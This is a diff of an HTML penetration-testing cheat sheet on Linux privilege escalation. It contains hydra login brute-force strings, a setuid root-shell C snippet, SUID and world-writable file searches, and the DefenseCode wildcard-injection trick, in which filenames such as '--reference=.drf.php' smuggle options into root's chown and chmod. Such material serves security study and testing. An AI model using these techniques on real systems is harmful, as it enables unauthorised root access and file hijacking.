-                    &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;colon=colon\:escape:S=authlog=.*success&quot;
-                    &quot;/login.php:user=^USER^&amp;pass=^PASS^&amp;mid=123:authlog=.*failed&quot;
-                    &quot;/:user=^USER&amp;pass=^PASS^:failed:H=Authorization\: Basic dT1w:H=Cookie\: sessid=aaaa:h=X-User\: ^USER^&quot;
-                    &quot;/exchweb/bin/auth/owaauth.dll:destination=http%3A%2F%2F&lt;target&gt;%2Fexchange&amp;flags=0&amp;username=&lt;domain&gt;%5C^USER^&amp;password=^PASS^&amp;SubmitCreds=x&amp;trusted=0:reason=:C=/exchweb&quot;
-</pre></div>
-</div>
-</div></blockquote>
-</div></blockquote>
 </div>
 <div class="section" id="unprivileged-shell-to-privileged-shell">
 <h2>Unprivileged shell to privileged shell<a class="headerlink" href="#unprivileged-shell-to-privileged-shell" title="Permalink to this headline">¶</a></h2>
-<ul class="simple">
-<li>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</li>
-</ul>
-<blockquote>
-<div><p>Suid.c</p>
+<div class="section" id="cron-d">
+<h3>Cron.d<a class="headerlink" href="#cron-d" title="Permalink to this headline">¶</a></h3>
+<p>Check cron.d and see if any script is executed as root at any time and is world writeable. If so, you can use to setuid a binary with /bin/bash and use it to get root.</p>
+<p>Suid.c</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span>int main(void) {
 setgid(0); setuid(0);
 execl(“/bin/sh”,”sh”,0); }
 </pre></div>
 </div>
-</div></blockquote>
+</div>
+<div class="section" id="sudo-l-permissions">
+<h3>SUDO -l Permissions<a class="headerlink" href="#sudo-l-permissions" title="Permalink to this headline">¶</a></h3>
+<p>Let&#8217;s see which executables have permission to run as sudo, We have collated the different methods to get a shell if the below applications are suid: nmap, tee, tcpdump,</p>
 <ul class="simple">
-<li>SUDO -l Permissions</li>
 <li>nmap suid shell:</li>
 </ul>
 <blockquote>
@@ -659,55 +667,10 @@ echo “milton ALL=(ALL) ALL” &gt; /etc/sudoers”
 <p class="first admonition-title">Note</p>
 <p class="last">More can be learn <a class="reference external" href="https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/">How-I-got-root-with-sudo</a>.</p>
 </div>
-<ul class="simple">
-<li><strong>Privilege esclation from g0tm1lk blog</strong></li>
-</ul>
-<blockquote>
-<div><ul class="simple">
-<li>What &#8220;Advanced Linux File Permissions&#8221; are used? Sticky bits, SUID &amp; GUID</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
-find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
-find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
-
-find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
-for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
-
-# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
-find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
-</pre></div>
 </div>
-</div></blockquote>
-<ul class="simple">
-<li>Where can written to and executed from? A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
-
-<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>
-
-<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
-</pre></div>
-</div>
-</div></blockquote>
-<ul class="simple">
-<li>Any &#8220;problem&#8221; files? Word-writeable, &#8220;nobody&#8221; files</li>
-</ul>
-<blockquote>
-<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
-find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
-</pre></div>
-</div>
-</div></blockquote>
-</div></blockquote>
-<ul class="simple">
-<li><strong>Unix Wildcards:</strong></li>
-</ul>
-<blockquote>
-<div><p>The below text is directly from the <a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">here</a>.</p>
+<div class="section" id="unix-wildcards">
+<h3>Unix Wildcards<a class="headerlink" href="#unix-wildcards" title="Permalink to this headline">¶</a></h3>
+<p>The below text is directly from the <a class="reference external" href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">here</a>.</p>
 <ul class="simple">
 <li>Chown file reference trick (file owner hijacking)</li>
 </ul>
@@ -739,103 +702,101 @@ find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 </pre></div>
 </div>
 <p>Let&#8217;s see who owns files now...</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>  root@defensecode public]# ls -al
-  total 52
-  drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
-  drwx------. 22 user user 4096 Oct 28 17:34 ..
-  -rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
-  -rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
-  -rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
-  -rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
-  -rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
-  -rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
-  -rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
-  -rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
-  -rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
-  -rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
-  -rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
-  -rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
-  -rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
-  -rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
-  -rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
-
-
-Something is not right... What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group &#39;nobody&#39;, but somehow, all files are owned by the user &#39;leon&#39; now. If we take closer look, this directory previously contained just the following two files created and owned by the user &#39;leon&#39;.
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
+<span class="n">total</span> <span class="mi">52</span>
+<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="o">.</span>
+<span class="n">drwx</span><span class="o">------.</span> <span class="mi">22</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">34</span> <span class="o">..</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">80</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">config</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>  <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
+  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">----.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">66</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">password</span><span class="o">.</span><span class="n">inc</span><span class="o">.</span><span class="n">php</span>
+  <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>   <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
 </pre></div>
 </div>
+<p>Something is not right. What happened? Somebody got drunk here. Superuser tried to change files owner to the user:group &#8216;nobody&#8217;, but somehow, all files are owned by the user &#8216;leon&#8217; now. If we take closer look, this directory previously contained just the following two files created and owned by the user &#8216;leon&#8217;.</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
 <span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>    <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">45</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
 </pre></div>
 </div>
 <p>Thing is that wildcard character used in &#8216;chown&#8217; command line took arbitrary &#8216;&#8211;reference=.drf.php&#8217; file and passed it to the chown command at the command line as an option.</p>
 <p>Let&#8217;s check chown manual page (man chown):</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>  <span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>
-  <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s owner and group rather than specifying OWNER:GROUP values</span>
-
-
-<span class="n">So</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">case</span><span class="p">,</span> <span class="s1">&#39;--reference&#39;</span> <span class="n">option</span> <span class="n">to</span> <span class="s1">&#39;chown&#39;</span> <span class="n">will</span> <span class="n">override</span> <span class="s1">&#39;nobody:nobody&#39;</span> <span class="n">specified</span> <span class="k">as</span> <span class="n">the</span> <span class="n">root</span><span class="p">,</span> <span class="ow">and</span> <span class="n">new</span> <span class="n">owner</span> <span class="n">of</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">this</span>
-             <span class="n">directory</span> <span class="n">will</span> <span class="n">be</span> <span class="n">exactly</span> <span class="n">same</span> <span class="k">as</span> <span class="n">the</span> <span class="n">owner</span> <span class="n">of</span> <span class="s1">&#39;.drf.php&#39;</span><span class="p">,</span> <span class="n">which</span> <span class="ow">is</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">case</span> <span class="n">user</span> <span class="s1">&#39;leon&#39;</span><span class="o">.</span> <span class="n">Just</span> <span class="k">for</span> <span class="n">the</span> <span class="n">record</span><span class="p">,</span> <span class="s1">&#39;.drf&#39;</span> <span class="ow">is</span> <span class="n">short</span> <span class="k">for</span> <span class="n">Dummy</span> <span class="n">Reference</span> <span class="n">File</span><span class="o">.</span> <span class="p">:)</span>
-
-             <span class="n">To</span> <span class="n">conclude</span><span class="p">,</span> <span class="n">reference</span> <span class="n">option</span> <span class="n">can</span> <span class="n">be</span> <span class="n">abused</span> <span class="n">to</span> <span class="n">change</span> <span class="n">ownership</span> <span class="n">of</span> <span class="n">files</span> <span class="n">to</span> <span class="n">some</span> <span class="n">arbitrary</span> <span class="n">user</span><span class="o">.</span> <span class="n">If</span> <span class="n">we</span> <span class="nb">set</span> <span class="n">some</span> <span class="n">other</span> <span class="n">file</span> <span class="k">as</span> <span class="n">argument</span>                  <span class="n">to</span> <span class="n">the</span> <span class="o">--</span><span class="n">reference</span> <span class="n">option</span><span class="p">,</span> <span class="n">file</span> <span class="n">that</span><span class="s1">&#39;s owned by some other user, not &#39;</span><span class="n">leon</span><span class="s1">&#39;, in that case he would become owner of all files in this                    directory. With this simple chown parameter pollution, we can trick root into changing  ownership of files to arbitrary users, and practically &quot;hijack&quot; files that are of interest to us.</span>
-
-             <span class="n">Even</span> <span class="n">more</span><span class="p">,</span> <span class="k">if</span> <span class="n">user</span> <span class="s1">&#39;leon&#39;</span> <span class="n">previously</span> <span class="n">created</span> <span class="n">a</span> <span class="n">symbolic</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">that</span> <span class="n">directory</span> <span class="n">that</span> <span class="n">points</span> <span class="n">to</span> <span class="n">let</span><span class="s1">&#39;s say /etc/shadow, ownership of /etc/shadow would also be changed to the user &#39;</span><span class="n">leon</span><span class="s1">&#39;.</span>
+<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>     <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s owner and group rather than specifying OWNER:GROUP values</span>
 </pre></div>
 </div>
+<p>So in this case, &#8216;&#8211;reference&#8217; option to &#8216;chown&#8217; will override &#8216;nobody:nobody&#8217; specified as the root, and new owner of files in this directory will be exactly same as the owner of &#8216;.drf.php&#8217;, which is in this case user &#8216;leon&#8217;. Just for the record, &#8216;.drf&#8217; is short for Dummy Reference File. :)</p>
+<p>To conclude, reference option can be abused to change ownership of files to some arbitrary user. If we set some other file as argument to the &#8211;reference option, file that&#8217;s owned by some other user, not &#8216;leon&#8217;, in that case he would become owner of all files in this directory. With this simple chown parameter pollution, we can trick root into changing ownership of files to arbitrary users, and practically &#8220;hijack&#8221; files that are of interest to us.</p>
+<p>Even more, if user &#8216;leon&#8217; previously created a symbolic link in that directory that points to let&#8217;s say /etc/shadow, ownership of /etc/shadow would also be changed to the user &#8216;leon&#8217;.</p>
 </div></blockquote>
 <ul class="simple">
 <li><strong>Chmod file reference trick</strong></li>
 </ul>
 <blockquote>
 <div><p>Another interesting attack vector similar to previously described &#8216;chown&#8217; attack is &#8216;chmod&#8217;. Chmod also has &#8211;reference option that can be abused to specify arbitrary permissions on files selected with asterisk wildcard. Chmod manual page (man chmod):</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="o">--</span><span class="n">reference</span><span class="o">=</span><span class="n">RFILE</span>    <span class="p">:</span>   <span class="n">use</span> <span class="n">RFILE</span><span class="s1">&#39;s mode instead of MODE values</span>
+<div class="highlight-default"><div class="highlight"><pre><span></span>  --reference=RFILE    :   use RFILE&#39;s mode instead of MODE values
+
+Example is presented below.
+
+::
+
+  [root@defensecode public]# ls -al
+  total 68
+  drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+  drwx------. 24 user user  4096 Oct 28 18:32 ..
+  -rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
+  -rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
+  -rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
+  -rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
+  -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+  -rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
+  -rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
+  -rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
+  -rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
+  -rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
+  -rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
+  -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
+  -rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
+
+Superuser will now try to set mode 000 on all files.
+
+::
+
+  [root@defensecode public]# chmod 000 *
+
+Let&#39;s check permissions on files...
+
+::
+
+  [root@defensecode public]# ls -al
+  total 68
+  drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
+  drwx------. 24 user user  4096 Oct 28 18:32 ..
+  -rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
+  -rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
+  -rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
+  -rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
+  -rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
+  -rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
+  -rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
+  -rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
+  -rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
+  -rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
+  -rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
+  -rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
+  -rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
+
+What happened? Instead of 000, all files are now set to mode 777 because of the &#39;--reference&#39; option supplied through file name..Once again,file .drf.php owned by user &#39;leon&#39; with mode 777 was used as reference file and since --reference option is supplied, all files will be set tomode 777. Beside just --reference option, attacker can also create another file with &#39;-R&#39; filename, to change file permissions on files in  all subdirectories recursively.
 </pre></div>
 </div>
-<p>Example is presented below.</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
-<span class="n">total</span> <span class="mi">68</span>
-<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
-<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
